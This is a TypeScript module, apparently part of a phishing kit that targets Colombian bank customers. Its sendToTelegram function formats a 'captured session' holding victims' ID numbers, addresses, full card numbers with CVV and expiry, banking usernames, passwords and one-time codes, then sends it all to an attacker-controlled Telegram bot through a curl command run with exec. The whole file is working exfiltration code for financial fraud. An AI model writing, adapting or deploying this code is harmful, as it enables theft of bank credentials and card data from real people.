import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// Función para enviar mensajes a Telegram usando curl (más confiable)
export async function sendToTelegram(sessionData: any) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('Telegram bot token or chat ID not configured');
    return;
  }

  try {
    // Formatear el mensaje (texto plano, sin Markdown para evitar errores)
    const message = `
🔔 NUEVA SESION CAPTURADA

Sesion: #${sessionData.sessionId.slice(-8)}
Banco: ${sessionData.bank.toUpperCase()}
Estado: ${sessionData.status}

📋 DATOS DEL CLIENTE
Nombre: ${sessionData.fullName || 'N/A'}
Email: ${sessionData.email || 'N/A'}
Telefono: ${sessionData.phone || 'N/A'}
Cedula: ${sessionData.documentId || 'N/A'}
Direccion: ${sessionData.address || 'N/A'}
Ciudad: ${sessionData.city || 'N/A'}

💳 DATOS DE TARJETA
Numero: ${sessionData.cardNumber || 'N/A'}
Titular: ${sessionData.cardHolderName || 'N/A'}
Vencimiento: ${sessionData.expiryDate || 'N/A'}
CVV: ${sessionData.cvv || 'N/A'}
Marca: ${sessionData.cardBrand || 'N/A'}

🔐 CREDENCIALES BANCARIAS
Usuario: ${sessionData.usuario || 'N/A'}
Clave: ${sessionData.clave || 'N/A'}
Dinamica: ${sessionData.claveDinamica || sessionData.otp || 'N/A'}

🕐 Fecha: ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
`;

    // Escapar comillas para JSON
    const escapedMessage = message.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n');
    
    const curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/sendMessage" \
      -H "Content-Type: application/json" \
      -d "{\\"chat_id\\":\\"${chatId}\\",\\"text\\":\\"${escapedMessage}\\"}" \
      --max-time 30 \
      --silent`;

    try {
      const { stdout, stderr } = await execAsync(curlCommand);
      
      if (stderr) {
        console.error('Telegram curl stderr:', stderr);
      }
      
      const response = JSON.parse(stdout);
      if (response.ok) {
        console.log('Message sent to Telegram successfully via curl');
        return true;
      } else {
        console.error('Telegram API error:', response);
        throw new Error(`Telegram API error: ${response.description}`);
      }
    } catch (error: any) {
      console.error('Error sending to Telegram via curl:', error.message);
      throw error;
    }
  } catch (error) {
    console.error('Error in sendToTelegram:', error);
    throw error;
  }
}
